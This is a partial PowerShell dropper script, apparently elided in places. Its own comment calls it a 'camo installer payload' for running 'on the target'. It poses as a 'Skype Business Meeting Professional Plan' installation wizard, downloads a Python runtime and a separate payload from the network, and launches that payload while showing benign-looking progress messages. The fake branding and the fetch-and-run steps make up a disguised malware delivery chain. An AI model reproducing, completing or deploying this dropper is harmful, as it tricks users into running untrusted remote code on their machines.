# payload.ps1 - the camo installer payload that runs on the target

try { $Host.UI.RawUI.WindowTitle = "Skype Business Meeting Professional Plan - Installation Wizard" } catch {}
try { Add-Type -Namespace Win32 -Name Console -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetStdHandle(int nStdHandle); [DllImport("kernel32.dll")] public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode); [DllImport("kernel32.dll")] public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);'
...
if ($pythonExe) {
    ...
    try {
        ...
        $wc.DownloadFile($embedUrl, $PythonZip)
    } catch {}
    if (Test-Path $PythonZip) {
        ...
        try {
            ...
            if (Test-Path $pythonExe) { Log-Ok "Runtime installed successfully" } else { Log-Warn "Runtime extraction failed" }
        } catch { Log-Warn "Extraction failed" }
    } else { Log-Warn "Failed to download runtime package" }
}
...
if (Test-Path $PayloadPath) { Log-Ok "Application package ready" } else { Log-Warn "Failed to download application" }
...
if (Test-Path $PayloadPath) {
    ...
    } catch { Log-Warn "Failed to start application" }
}
